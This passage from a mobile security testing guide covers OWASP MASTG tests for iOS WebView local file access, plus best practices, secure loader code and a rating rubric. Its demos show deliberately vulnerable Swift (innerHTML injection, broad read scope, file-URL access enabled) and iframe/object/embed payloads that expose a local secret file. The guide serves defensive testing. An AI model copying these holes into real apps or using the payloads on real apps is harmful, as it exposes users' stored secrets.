#### Demo

[MASTG-DEMO-0096](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0096/MASTG-DEMO-0096/). The app writes `secret.txt` and `index.html` into `Documents`, appends the user's name to the file URL as a query parameter, and grants read access to the whole directory; the page writes the parameter into the DOM with `innerHTML`:

```swift
private static let docDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
private static let fileURL = docDir.appendingPathComponent("index.html")

let urlWithUsername = URL(string: "\(fileURL.absoluteString)?username=\(username)")
webView.loadFileURL(urlWithUsername!, allowingReadAccessTo: docDir)   // whole Documents directory
// index.html: document.getElementById('username').innerHTML = new URLSearchParams(location.search).get('username');
```

The r2 script finds the read-scope initialiser through the API it calls, not through symbol names:

```text
xrefs to URLsForDirectory:inDomains: (finds the allowingReadAccessTo lazy initializer):
sym.MASTestApp.MastgTest.docDir... 0x100004094 [DATA:r--] ldr x1, reloc.fixup.URLsForDirectory:inDomains:

0x100004094      ldr x1, [x8, 0x130]   ; URLsForDirectory:inDomains:
0x100004098      mov w2, 9             ; NSDocumentDirectory
0x10000409c      mov w3, 1             ; NSUserDomainMask
...
0x100004f14      mov x0, x25           ; WKWebView
0x100004f18      mov x2, x26           ; urlWithUsername
0x100004f1c      mov x3, x20           ; allowingReadAccessTo = docDir
0x100004f20      bl sym.imp.objc_msgSend   ; loadFileURL:allowingReadAccessToURL:

HTML template string (contains innerHTML injection):
0x10000b261 hit4_0 "yId('username').innerHTML = name;</scrip"
```

Entering `<iframe src="./secret.txt"></iframe>` (or `<object data="./secret.txt" type="text/plain"></object>`, or `<embed src="./secret.txt" type="text/plain">`) as the name renders the secret inside the page. The test fails. Note what this demo does and does not show: the file is **displayed**, not read by script, because `allowFileAccessFromFileURLs` is off. OWASP's fix moves the page into a dedicated `webContent/` subdirectory, scopes `allowingReadAccessTo` to it, and replaces `innerHTML` with `textContent`.

### MASTG-TEST-0335: WebView File Origin Access Relaxed by Configuration (iOS)

Source: [MASTG-TEST-0335](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0335/). Platform: iOS. Type: static (code), manual. Knowledge: MASTG-KNOW-0076. Best practice: MASTG-BEST-0033.

#### Overview

The test looks for code that enables `allowFileAccessFromFileURLs` (on `WKPreferences`) or `allowUniversalAccessFromFileURLs` (on `WKWebViewConfiguration`), normally through `setValue(_:forKey:)`. It is the script-level complement of 0333: 0333 asks which files the WebView may load at all, this test asks whether script in a local page may read them (and, with universal access, read anything). Even with a correctly narrow read scope, the preferences increase what an XSS or local file inclusion can do. JavaScript is on unless the app sets `WKWebpagePreferences.allowsContentJavaScript` (or the deprecated `WKPreferences.javaScriptEnabled`) to `false`.

#### Prerequisites

A decrypted binary and radare2, as for 0333.

#### Steps

1. **Search every Mach-O for the keys**, using the loop in [Before you start](#before-you-start-inventory-every-webview), and for direct private selector use:

   ```bash
   rabin2 -zz Payload/App.app/App | grep -E 'allowFileAccessFromFileURLs|allowUniversalAccessFromFileURLs|_setAllowFileAccessFromFileURLs|_setAllowUniversalAccessFromFileURLs'
   ```

2. **Find the code that uses them** with OWASP's r2 script approach:

   ```text
   e bin.relocs.apply=true
   f~AccessFromFileURLs          # string addresses
   f~setValue                    # the setValue:forKey: selector reloc
   axt 0x10000da70               # xrefs to "allowFileAccessFromFileURLs"
   axt 0x10000da90               # xrefs to "allowUniversalAccessFromFileURLs"
   pd-- 10 @ 0x100004b64         # disassembly around the use
   ```

   ```bash
   r2 -q -e bin.relocs.apply=true -i webview_file_access.r2 -A Payload/App.app/App > output.txt
   ```

3. **Read the value.** The Swift-to-Objective-C pattern is: `mov w0, 1` (or `0`), a call to the `Bool._bridgeToObjectiveC()` thunk producing an `NSNumber`, the key string bridged to `NSString`, then `setValue:forKey:` with the preferences or configuration object as receiver. `1` means enabled.
4. **Tie it to a WebView and a load.** Follow the configuration object into `initWithFrame:configuration:` and the resulting web view into `loadFileURL:allowingReadAccessToURL:` or `loadHTMLString:baseURL:` with a file base URL. Values computed at runtime (from remote config, a plist, a framework option) may not resolve statically; confirm with 0336.

#### Observation

The locations where the keys or private setters are used, the value set, the WebView that receives the configuration, and how that WebView loads local content.

#### Evaluation

The test **fails** if the app enables `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` for a `WKWebView` that loads local `file://` content. Further validation, as OWASP lists it: is the setting explicitly set to `true`; which WebView gets it and does that WebView handle sensitive information or functionality; does it load local content (`loadFileURL`, or `loadHTMLString` with a `file://` base URL); can attacker-controlled script run in that page; and can it get data out (any outbound request, an image or iframe URL). Setting a key to `false` explicitly passes, but is worth a note: it usually means someone experimented with it.

#### Demo

[MASTG-DEMO-0098](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0098/MASTG-DEMO-0098/). The app creates `Caches/demoRoot/app/` (with `index.html` and `api-key.txt`) and `Caches/demoRoot/other/other.html`, enables file access from file URLs, leaves universal access off, and deliberately grants `demoRoot`:

```swift
let configuration = WKWebViewConfiguration()
let preferences = WKWebpagePreferences()
preferences.allowsContentJavaScript = true
configuration.defaultWebpagePreferences = preferences
configuration.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
configuration.setValue(false, forKey: "allowUniversalAccessFromFileURLs")
let webView = WKWebView(frame: .zero, configuration: configuration)
webView.loadFileURL(indexURL, allowingReadAccessTo: demoRoot)
// index.html: fetch("./api-key.txt"), XMLHttpRequest("../other/other.html"), <iframe src="../other/other.html">
```

```text
Uses of the APIs:
0x10000da70 28 str.allowFileAccessFromFileURLs
0x10000da90 33 str.allowUniversalAccessFromFileURLs
0x10000eb54 37 str.loadFileURL:allowingReadAccessToURL:

xrefs:
sym.func.100004ad8 0x100004b64 [STRN:r--] add x8, x8, str.allowFileAccessFromFileURLs
sym.func.100004ad8 0x100004bac [STRN:r--] add x8, x8, str.allowUniversalAccessFromFileURLs

0x100004b54      mov w0, 1                 ; true -> NSNumber
0x100004b64      add x8, x8, 0xa70         ; "allowFileAccessFromFileURLs"
0x100004b8c      bl fcn.10000c780          ; setValue:forKey:
0x100004b9c      mov w0, 0                 ; false -> NSNumber
0x100004bac      add x8, x8, 0xa90         ; "allowUniversalAccessFromFileURLs"
0x100004bd0      bl fcn.10000c780          ; setValue:forKey:
...
0x100005204      mov x2, x24               ; fileURL = indexURL
0x100005208      mov x3, x20               ; allowingReadAccessTo = demoRoot
0x10000520c      bl fcn.10000c680          ; loadFileURL:allowingReadAccessToURL:
```

The test fails. Script in `index.html` reads both `api-key.txt` (with `fetch`) and `../other/other.html` (with XHR). With `allowingReadAccessTo: indexURL` instead, the same preference reads nothing on a device, and WebKit logs *"Ignoring request to load this main resource because it is outside the sandbox"*. OWASP's warning applies: on the Simulator the reads succeeded even with the narrow scope, so the boundary must be tested on hardware.

### MASTG-TEST-0336: Runtime Setting of Relaxed WebView File Origin Policies (iOS)

Source: [MASTG-TEST-0336](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0336/). Platform: iOS. Type: dynamic (hooks), manual. Knowledge: MASTG-KNOW-0076. Best practice: MASTG-BEST-0033.

#### Overview

The dynamic counterpart of 0335: confirm at runtime whether a `WKWebView` that loads local content has either file-URL preference enabled, and capture the read scope of each local load. Hooks: `-[WKPreferences _setAllowFileAccessFromFileURLs:]`, `-[WKWebViewConfiguration _setAllowUniversalAccessFromFileURLs:]` (the setters KVC ends up calling), `-[WKPreferences setJavaScriptEnabled:]`, `-[WKWebView loadFileURL:allowingReadAccessToURL:]`, and `-[WKWebView loadHTMLString:baseURL:]` for file base URLs.

#### Prerequisites

- A jailbroken device with `frida-server`, or a re-signed app with the Frida gadget ([MASTG-TOOL-0039](https://mas.owasp.org/MASTG/tools/ios/MASTG-TOOL-0039/)); the app installed ([MASTG-TECH-0056](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0056/)).
- A physical device for the final file-access check (see the Simulator caveat above).

#### Steps

1. **Quick trace** with `frida-trace` ([MASTG-TECH-0095](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0095/)):

   ```bash
   frida-trace -U -f com.example.app \
     -m '-[WKPreferences _setAllowFileAccessFromFileURLs:]' \
     -m '-[WKWebViewConfiguration _setAllowUniversalAccessFromFileURLs:]' \
     -m '-[WKWebView loadFileURL:allowingReadAccessToURL:]' \
     -m '-[WKWebView loadHTMLString:baseURL:]'
   ```

2. **Argument-level hooks** with OWASP's script from DEMO-0099, which replaces the implementations and prints the boolean and both URLs. A condensed version, extended with `loadHTMLString:baseURL:`:

   ```javascript
   // wk-file-access.js
   const P = ObjC.classes.WKPreferences, C = ObjC.classes.WKWebViewConfiguration, W = ObjC.classes.WKWebView;

   function hookBool(klass, sel, label) {
     const m = klass[sel];
     if (!m) { console.log(`[!] ${sel} not found`); return; }
     const orig = m.implementation;
     m.implementation = ObjC.implement(m, (self, cmd, value) => {
       console.log(`[${label}] = ${value}`);
       orig(self, cmd, value);
     });
   }
   hookBool(P, '- _setAllowFileAccessFromFileURLs:', 'WKPreferences allowFileAccessFromFileURLs');
   hookBool(C, '- _setAllowUniversalAccessFromFileURLs:', 'WKWebViewConfiguration allowUniversalAccessFromFileURLs');
   hookBool(P, '- setJavaScriptEnabled:', 'WKPreferences javaScriptEnabled');

   Interceptor.attach(W['- loadFileURL:allowingReadAccessToURL:'].implementation, {
     onEnter(args) {
       console.log('[WKWebView] loadFileURL\n  fileURL: ' + new ObjC.Object(args[2]).absoluteString() +
                   '\n  allowingReadAccessTo: ' + new ObjC.Object(args[3]).absoluteString());
     }
   });
   Interceptor.attach(W['- loadHTMLString:baseURL:'].implementation, {
     onEnter(args) {
       const base = args[3].isNull() ? 'nil' : new ObjC.Object(args[3]).absoluteString();
       console.log('[WKWebView] loadHTMLString baseURL: ' + base);
     }
   });
   ```

   ```bash
   frida -U -f com.example.app -l wk-file-access.js -o wk.txt     # spawn
   frida -U -n App -l wk-file-access.js -o wk.txt                 # or attach to a running app
   ```

3. **Read back the effective state** of live web views (useful when the setting was applied before you attached):

   ```javascript
   ObjC.choose(ObjC.classes.WKWebView, {
     onMatch(wv) {
       const cfg = wv.configuration();
       console.log(wv.URL() + ' fileFromFile=' + cfg.preferences().valueForKey_('allowFileAccessFromFileURLs') +
                   ' universal=' + cfg.valueForKey_('allowUniversalAccessFromFileURLs'));
     },
     onComplete() {}
   });
   ```

   `valueForKey:` resolves to the private `_allowFileAccessFromFileURLs` getter by the same KVC search rules.
4. **Exercise the app** across every screen with web content, then map backtraces or call sites to code ([MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/)).

#### Observation

Calls that set either preference, with values; every local load with its file URL and read scope or base URL; the screen or flow that triggered each.

#### Evaluation

The test **fails** if the app enables `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs` for a `WKWebView` that loads local `file://` content. Validate further as in 0335 (explicitly `true`? which WebView? sensitive? local content? attacker script? exfiltration?). Where exploitability cannot be proven, OWASP still recommends removing the settings: they weaken the isolation of `file://` content and raise the impact of every other WebView bug.

#### Demo

[MASTG-DEMO-0099](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0099/MASTG-DEMO-0099/), the DEMO-0098 app with the hooks (the published output was captured on the Simulator, hence the `CoreSimulator` path):

```text
[+] Hooks deployed successfully.
[WKPreferences: allowFileAccess] = 1
[WKWebViewConfig: universalAccess] = 0
[WKWebView] loadFileURL called
  fileURL: file:///Users/user/Library/Developer/CoreSimulator/Devices/<device>/data/Containers/Data/Application/<app>/Library/Caches/demoRoot/app/index.html
  allowingReadAccessTo: file:///Users/user/Library/Developer/CoreSimulator/Devices/<device>/data/Containers/Data/Application/<app>/Library/Caches/demoRoot/
```

The test fails: file access from file URLs is `1` for a WebView that loads `index.html` with read access to the whole `demoRoot`, so script in the page can read every file below it.

### Bridge tests OWASP files under MASWE-0034

OWASP currently files these tests under MASWE-0034. We document them in the [MASWE-0033 note](/mobile/maswe-0033-sensitive-native-functionality-exposed-in-webviews/) because they test what native functionality and data the JavaScript bridge exposes, not local file or content access:

| Test | Platform | Title |
|---|---|---|
| [MASTG-TEST-0334](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0334/) | Android | Native Code Exposed Through WebViews |
| [MASTG-TEST-0376](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0376/) | iOS | References to Native Bridge APIs in WebViews |
| [MASTG-TEST-0377](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0377/) | iOS | References to `evaluateJavaScript` Used as Bridge Reply in `WKScriptMessageHandler` |
| [MASTG-TEST-0378](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0378/) | iOS | References to Password Fields in WebView-Loaded HTML |
| [MASTG-TEST-0379](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0379/) | iOS | References to `evaluateJavaScript` Without Content World Isolation |
| [MASTG-TEST-0380](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0380/) | iOS | References to `evaluateJavaScript` Writing Sensitive Data into WebView DOM |

When a WebView fails both a test here and one of those, rate them together: a bridge reachable from a privileged local page raises the impact of either finding.

## Best practices

### MASTG-BEST-0011: Securely Load File Content in a WebView (Android)

Source: [MASTG-BEST-0011](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0011/). Platform: Android.

Load local content through `WebViewAssetLoader` over `https://appassets.androidplatform.net` instead of `file://` URLs, so it gets an ordinary web origin and the file flags become irrelevant. If `file://` cannot be avoided, keep `setAllowFileAccess`, `setAllowFileAccessFromFileURLs` and `setAllowUniversalAccessFromFileURLs` at `false`, and set them explicitly whenever the app's target level does not already make them `false` by default. Android's [load local content](https://developer.android.com/develop/ui/views/layout/webapps/load-local-content) guide, including its "Things to avoid" list, recommends setting the two relaxation flags to `false` on all API levels. The setup from Android's risk guidance:

```kotlin
val assetLoader = WebViewAssetLoader.Builder()
    .addPathHandler("/assets/", WebViewAssetLoader.AssetsPathHandler(this))
    .build()

webView.webViewClient = object : WebViewClientCompat() {
    override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse? =
        assetLoader.shouldInterceptRequest(request.url)
}

webView.settings.apply {
    allowFileAccess = false
    allowContentAccess = false
    @Suppress("DEPRECATION")
    allowFileAccessFromFileURLs = false
    @Suppress("DEPRECATION")
    allowUniversalAccessFromFileURLs = false
}
webView.loadUrl("https://appassets.androidplatform.net/assets/www/index.html")
```

For HTML the app builds as a string, use `loadDataWithBaseURL()` with an https base URL you control (not `file:///`), or Base64-encoded `loadData()`.

### MASTG-BEST-0013: Disable Content Provider Access in WebViews

Source: [MASTG-BEST-0013](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0013/). Platform: Android.

`setAllowContentAccess` is `true` by default on every API level, so call `setAllowContentAccess(false)` in every WebView that does not need `content://` URLs. On its own it is not a vulnerability, but it lets an injection reach the app's own providers (including non-exported ones, which may serve internal storage) and readable providers of other apps, depending on the app's permissions.

### MASTG-BEST-0012: Disable JavaScript in WebViews

Source: [MASTG-BEST-0012](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0012/). Platform: Android.

JavaScript is off by default and should stay off for static content: help pages, legal text, release notes. Enabling it is not a finding by itself, and hybrid apps need it; the risk comes from combining it with untrusted content, bridges, file or content access, or loose URL loading. For external content prefer Custom Tabs or Trusted Web Activities. Where JavaScript is required: allowlist origins, validate scheme and host before loading, keep file and content access off, do not expose bridges to untrusted content, and keep Safe Browsing on (`setSafeBrowsingEnabled(true)`, API 26+).

### MASTG-BEST-0049: Restrict and Validate Access to Exported Content Providers

Source: [MASTG-BEST-0049](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0049/). Platform: Android.

Set `android:exported="false"` explicitly on providers that are internal; protect exported ones with `readPermission`/`writePermission` backed by a `signature` permission; share files through a non-exported `FileProvider` with narrow path declarations (never `<root-path>` or `path="."`) and one-off URI grants. This limits what a WebView with content access can reach. The provider side is covered in [MASWE-0018](/mobile/maswe-0018-missing-auth-on-app-components/).

### MASTG-BEST-0010: Use Up-to-Date minSdkVersion

Source: [MASTG-BEST-0010](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0010/). Platform: Android.

OWASP links this practice because old platform defaults linger. For the WebView defaults in this note, the deciding value is `targetSdkVersion` (see [the defaults table](#webview-local-file-access-settings)), so keep the target current as well; explicit `false` values remove the question altogether.

### MASTG-BEST-0033: Securely Load File Content in a WebView (iOS)

Source: [MASTG-BEST-0033](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0033/). Platform: iOS.

- Do not set `allowFileAccessFromFileURLs` or `allowUniversalAccessFromFileURLs`. If a legacy design depends on them, load only trusted bundled content, sanitise anything inserted into the page, and keep sensitive data out of the readable scope.
- With `loadHTMLString(_:baseURL:)` or `load(_:mimeType:characterEncodingName:baseURL:)`, choose `baseURL` deliberately: `nil` gives an opaque origin; a `file://` base should point only at a controlled resource location such as the bundle.
- With `loadFileURL(_:allowingReadAccessTo:)` / `loadFileRequest(_:allowingReadAccessTo:)`, grant the minimum: the file itself, or a dedicated directory containing only web assets.

```swift
// Good: the page only
webView.loadFileURL(fileURL, allowingReadAccessTo: fileURL)
// Risky: every file in Documents
webView.loadFileURL(fileURL, allowingReadAccessTo: documentsDir)
```

- Turn content JavaScript off for static pages (`WKWebpagePreferences.allowsContentJavaScript = false`), keep untrusted input out of local pages, and consider [App-Bound Domains](https://webkit.org/blog/10882/app-bound-domains/) (`WKAppBoundDomains`, `limitsNavigationsToAppBoundDomains`) for WebViews that should only show your own domains.
- Do not use `UIWebView` (MASTG-BEST-0032).

### Secure patterns (Guler Tech)

**One configuration for untrusted content.** Give user-supplied links, downloaded documents and third-party pages a WebView configured for that purpose, rather than reusing the app's privileged one:

```kotlin
@Suppress("DEPRECATION")
fun WebView.configureForUntrustedContent() {
    settings.javaScriptEnabled = false
    settings.allowFileAccess = false
    settings.allowContentAccess = false
    settings.allowFileAccessFromFileURLs = false
    settings.allowUniversalAccessFromFileURLs = false
    // no addJavascriptInterface / addWebMessageListener on this instance
}
```

**Custom path handlers: canonicalise and stay inside the root.** If you must write your own `PathHandler` or `shouldInterceptRequest` logic, check the host, resolve the path canonically, and refuse anything outside the base directory:

```kotlin
class SafeDirHandler(context: Context) : WebViewAssetLoader.PathHandler {
    private val base = File(context.filesDir, "web").canonicalFile

    override fun handle(path: String): WebResourceResponse {
        val file = File(base, path).canonicalFile
        if (!file.path.startsWith(base.path + File.separator) || !file.isFile) {
            return WebResourceResponse(null, null, null)   // 404, no fallback to the network
        }
        val mime = URLConnection.guessContentTypeFromName(file.name) ?: "text/plain"
        return WebResourceResponse(mime, null, FileInputStream(file))
    }
}
```

Code-review checklist for existing loaders (no OWASP test covers them): is the host checked; is the path taken from a decoded segment (`getLastPathSegment()`, `getPathSegments()`) and joined without canonicalisation; is the source directory writable by downloads or other apps; does the response add `Access-Control-Allow-Origin: *`.

**iOS: a scheme handler with a fixed root.** `URL.path` is already percent-decoded, so standardise after joining and compare against the root:

```swift
import UniformTypeIdentifiers
import WebKit

final class LocalContentHandler: NSObject, WKURLSchemeHandler {
    private let root: URL
    init(root: URL) { self.root = root.standardizedFileURL.resolvingSymlinksInPath() }

    func webView(_ webView: WKWebView, start urlSchemeTask: WKURLSchemeTask) {
        guard let url = urlSchemeTask.request.url, url.host == "app" else { return fail(urlSchemeTask) }
        let file = root.appendingPathComponent(url.path).standardizedFileURL.resolvingSymlinksInPath()
        guard file.path.hasPrefix(root.path + "/"), let data = try? Data(contentsOf: file) else {
            return fail(urlSchemeTask)
        }
        let mime = UTType(filenameExtension: file.pathExtension)?.preferredMIMEType ?? "application/octet-stream"
        let response = HTTPURLResponse(url: url, statusCode: 200, httpVersion: "HTTP/1.1",
                                       headerFields: ["Content-Type": mime])!
        urlSchemeTask.didReceive(response)
        urlSchemeTask.didReceive(data)
        urlSchemeTask.didFinish()
    }

    func webView(_ webView: WKWebView, stop urlSchemeTask: WKURLSchemeTask) {}

    private func fail(_ task: WKURLSchemeTask) { task.didFailWithError(URLError(.fileDoesNotExist)) }
}

// Registration, before the web view is created
let config = WKWebViewConfiguration()
let webRoot = Bundle.main.resourceURL!.appendingPathComponent("www", isDirectory: true)
config.setURLSchemeHandler(LocalContentHandler(root: webRoot), forURLScheme: "myapp")
let webView = WKWebView(frame: .zero, configuration: config)
webView.load(URLRequest(url: URL(string: "myapp://app/index.html")!))
```

**Keep web-readable folders separate from data.** Whatever mechanism you use, put web assets in their own directory (`assets/www/`, `filesDir/web/`, `Library/Application Support/web/`) and never write tokens, databases or user documents there.

## Rating findings

Rate on three things: **what the WebView can read** (which settings, which read scope, which providers, and what sensitive data sits there), **how attacker content gets into the privileged page**, and **what attacker position that requires**. Without a path for attacker content, the settings are latent; with one, they decide whether an injection is a nuisance or data theft.

Attacker positions, from easiest to hardest:

- **A web page or link the user opens**, landing in a WebView or reaching a browsable deep link (one tap, sometimes a chooser).
- **A malicious app on the same device**, no special permissions, sending intents to exported components or offering `content://` URIs (on Android 11+ package visibility means the URI usually has to be granted to the victim app); background activity-launch restrictions mean it typically acts while in the foreground.
- **A file the user receives and opens** in the app (attachment, download, *Open in…*, Files app import).
- **A network attacker**, only where local pages pull script or data over cleartext or a broken TLS path ([MASWE-0026](/mobile/maswe-0026-cleartext-network-traffic/), [MASWE-0027](/mobile/maswe-0027-insecure-certificate-validation/)).
- **A compromised third-party script or CDN** included by a local page.

| Rating | Conditions |
|---|---|
| **Critical** | A privileged context that lets script **read** local data (Android: JavaScript + file access + a relaxation flag, or universal access + content access to a sensitive provider; iOS: `allowFileAccessFromFileURLs` with a read scope that includes sensitive files), reachable by attacker content from a link or a malicious app with no special permissions and at most one user interaction, where the readable data includes **credentials, session or refresh tokens, or cookies of the logged-in session**, and you have confirmed the read is possible in your lab. Also: a custom loader that serves files outside its root to any origin loaded in the WebView, where those files include tokens. |
| **High** | The same read capability with a harder path: the user must receive and open a file, or the content source is a third-party script or a network position; or the readable data is personal or business-sensitive but not authentication material; or a bridge is reachable from the same privileged page. |
| **Medium** | Read-enabling settings present (fails 0250 to 0253 or 0335/0336) on a WebView whose content you could not show to be attacker-influenced, but which shows downloadable, server-supplied or user-supplied content; an iOS read scope covering sensitive files combined with an injection that can only **display** them (DEMO-0096 pattern); universal access on a page that loads remote scripts. |
| **Low** | `allowFileAccess` true (explicitly, or by a target of API 29 or lower) without either relaxation flag; an over-broad iOS read scope with only static bundled content and nothing sensitive in scope; a custom loader with a host check but no canonicalisation, serving only a non-sensitive directory. |
| **Info** | Content access left at its default on WebViews showing only https content; flags explicitly set to `false`; deprecated setters called with `false`; settings that are correct but would be simpler with `WebViewAssetLoader` or a scheme handler. |

Raise a level when the readable files belong to many users or include long-lived secrets (a shared API key, a refresh token that does not rotate); lower one when every sensitive value in scope is encrypted with a key the WebView cannot reach (Keystore, Keychain). Results that only reproduce on the iOS Simulator or with an outdated Android WebView do not support a rating above Medium; record the OS, device and WebView version you tested. In the report, give the WebView class and its load call, the settings with whether they are explicit or defaults, the content path you identified, the files in reach, and the fix at the source (asset loader or scheme handler, flags off, narrow scope, separate untrusted WebView).

## References

- OWASP MASWE: [MASWE-0034: WebViews Allow Access to Local Resources with Untrusted Content](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/); related [MASWE-0033](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0033/), [MASWE-0035](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0035/) (CC BY-SA 4.0)
- OWASP MASVS: [MASVS-PLATFORM-2](https://mas.owasp.org/MASVS/controls/MASVS-PLATFORM-2/), [MASVS-STORAGE-2](https://mas.owasp.org/MASVS/controls/MASVS-STORAGE-2/), [MASVS-CODE-4](https://mas.owasp.org/MASVS/controls/MASVS-CODE-4/) (CC BY-SA 4.0)
- OWASP MASTG knowledge: [MASTG-KNOW-0018: WebViews (Android)](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/), [MASTG-KNOW-0076: WebViews (iOS)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0076/) (CC BY-SA 4.0)
- OWASP MASTG tests: [MASTG-TEST-0250](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/), [MASTG-TEST-0251](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0251/), [MASTG-TEST-0252](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0252/), [MASTG-TEST-0253](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0253/), [MASTG-TEST-0333](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0333/), [MASTG-TEST-0335](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0335/), [MASTG-TEST-0336](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0336/); bridge tests [MASTG-TEST-0334](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0334/), [0376](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0376/), [0377](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0377/), [0378](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0378/), [0379](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0379/), [0380](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0380/); legacy [MASTG-TEST-0031](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/), [MASTG-TEST-0032](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0032/), [MASTG-TEST-0076](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0076/), [MASTG-TEST-0077](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0077/) (CC BY-SA 4.0)
- OWASP MASTG demos: [MASTG-DEMO-0029](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0029/MASTG-DEMO-0029/), [MASTG-DEMO-0030](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0030/MASTG-DEMO-0030/), [MASTG-DEMO-0031](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0031/MASTG-DEMO-0031/), [MASTG-DEMO-0032](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0032/MASTG-DEMO-0032/), [MASTG-DEMO-0096](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0096/MASTG-DEMO-0096/), [MASTG-DEMO-0098](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0098/MASTG-DEMO-0098/), [MASTG-DEMO-0099](https://mas.owasp.org/MASTG/demos/ios/MASVS-PLATFORM/MASTG-DEMO-0099/MASTG-DEMO-0099/) (CC BY-SA 4.0)
- OWASP MASTG best practices: [MASTG-BEST-0010](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0010/), [MASTG-BEST-0011](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0011/), [MASTG-BEST-0012](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0012/), [MASTG-BEST-0013](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0013/), [MASTG-BEST-0033](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0033/), [MASTG-BEST-0049](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0049/) (CC BY-SA 4.0)
- OWASP MASTG techniques: [MASTG-TECH-0005](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0005/), [MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/), [MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/), [MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/), [MASTG-TECH-0043](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0043/), [MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/), [MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/), [MASTG-TECH-0056](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0056/), [MASTG-TECH-0058](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/), [MASTG-TECH-0066](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0066/), [MASTG-TECH-0076](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0076/), [MASTG-TECH-0095](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0095/) (CC BY-SA 4.0)
